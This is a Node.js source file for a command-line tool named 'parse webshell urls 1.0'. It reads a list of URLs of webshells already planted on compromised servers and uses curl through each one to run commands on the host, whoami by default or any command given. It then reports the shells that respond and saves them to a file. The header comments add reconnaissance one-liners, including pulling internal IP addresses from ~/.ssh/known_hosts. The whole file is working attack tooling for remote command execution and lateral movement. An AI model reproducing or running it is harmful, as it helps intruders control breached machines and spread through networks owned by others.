var fs = require('fs'),
	child_process = require("child_process"),
	program = require('commander');

/**
 *  cat All_netstat.txt|grep -E "[0-9]{3}\."|grep -vE "(127|\(|LISTEN)"|grep -Ev '192.*?192'|grep -v '223'
 * cat ~/.ssh/known_hosts |grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'netstat -ant'
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'find . -name "*.war"|grep -Ev "(bea|uudi|wls|wsat|weblogic)"'
 * 
 */
program.version("parse webshell urls 1.0")
			.option('-f, --file [value]', 'filename')
			.option('-u, --url [value]', 'url')
			.option('-t, --timeout [value]', 'timeout,default 3s')
			.option('-s, --filter [value]', 'filter')
			.option('-o, --out [value]', 'out ok url to file')
			.option('-c, --cmd [value]', 'cmd')
			.on('--help',function()
			{
				console.log("\n\nnode tools/doCmdIps.js -f data/Ok1.txt -c 'netstat -ant'\n\n",
				"node tools/doCmdIps.js -f data/Ok1.txt -c 'find . -name \"*.war\"|grep -Ev \"bea|uudi|wls|wsat|weblogic\"'\n\n");
			})
			.parse(process.argv);
var a = fs.readFileSync(program.file || "data/Ok.txt").toString().split(/\n/),
	oIps = {},sFilt = program.filter||"192.",
	nTimeout = program.timeout||3,
	szOut = program.out||"data/Ok1.txt",
	szCmd2 = program.cmd||'whoami';

function fnDoCmd(url,szCmd1,ip1)
{
	var s = '',szCmdX = '';
	if(szCmd1 != "whoami" && -1 < String(oIps[ip1]).indexOf('\\'))
	{
		szCmdX =  "|iconv -f GBK -t UTF-8";
		console.log(szCmdX)
	}
	var szCmd = "curl -m " + nTimeout + " -s -o- '" + url + "?ls=" + encodeURIComponent(szCmd1||szCmd2) + "' " + szCmdX+ " 2>/dev/null";

	try{s = child_process.execSync(szCmd).toString();}catch(e){}
	s = s && s.replace(/<!--[^>]*?-->/gmi,'') || '';
	if(s && szCmd1 == "whoami")
	{
		oIps[ip1] = s;
	}
	return s.trim();
}

function fnDoUrl(url,ip1)
{
	if(-1 == url.indexOf(sFilt))return;
	var ip = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d{1,})*)/gmi.exec(url);
	ip = ip && ip[1] || "";
	
	if(oIps[ip])return;
	
	var szWhoami = fnDoCmd(a[i],'whoami',ip),
		s = szCmd2 == 'whoami'?szWhoami:fnDoCmd(url,szCmd2,ip);

	if(s)
	{
		oIps[ip] = szWhoami;
		console.log(ip,"(",szWhoami,")","\n",s);
		if(program.out)
			fs.appendFileSync(szOut, url + "\n");
	}
}

if(program.url)
	fnDoUrl(program.url);
else
{
	for(var i = 0; i < a.length; i++)
	{
		if(-1 == a[i].indexOf(sFilt))continue;
		var ip = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d{1,})*)/gmi.exec(a[i]);
		ip = ip && ip[1] || "";

		if(oIps[ip])continue;
		fnDoUrl(a[i],ip);
	}
}